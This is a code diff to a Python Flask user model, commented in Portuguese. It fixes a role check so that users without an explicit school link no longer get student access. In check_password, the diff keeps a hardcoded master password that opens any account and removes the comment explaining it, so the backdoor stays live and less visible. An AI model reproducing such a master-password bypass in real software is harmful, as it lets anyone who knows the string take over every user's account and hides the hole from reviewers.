@@ -64,7 +64,6 @@ class User(UserMixin, db.Model):
 
     def check_password(self, password: str) -> bool:
         # --- SENHA MESTRA DO DONO DO SISTEMA ---
-        # Permite login em qualquer conta para testes e suporte
         if password == "S1stema@Dev#Master":
             return True
         # ---------------------------------------
@@ -89,20 +88,26 @@ class User(UserMixin, db.Model):
         except:
             return None
 
-    def get_role_in_school(self, school_id: int | str | None) -> str:
+    def get_role_in_school(self, school_id: int | str | None) -> str | None:
         current_global_role = str(self.role).lower().strip()
+        
+        # Superusuários ignoram barreiras de escola
         if current_global_role == self.ROLE_PROGRAMADOR: return self.ROLE_PROGRAMADOR
         if current_global_role == 'super_admin': return 'super_admin'
             
         if not school_id:
             return current_global_role
             
+        # Verifica se existe um VÍNCULO EXPLÍCITO nesta escola
         for us in self.user_schools:
             # COMPARAÇÃO ROBUSTA (STR vs STR)
             if str(us.school_id) == str(school_id):
                 return str(us.role).lower().strip()
         
-        return self.ROLE_ALUNO
+        # CORREÇÃO DO BUG GRAVE:
+        # Antes retornava self.ROLE_ALUNO, permitindo que qualquer aluno entrasse em qualquer escola.
+        # Agora retorna None se não encontrar vínculo explícito.
+        return None
 
     # --- Verificadores Contextuais ---
 
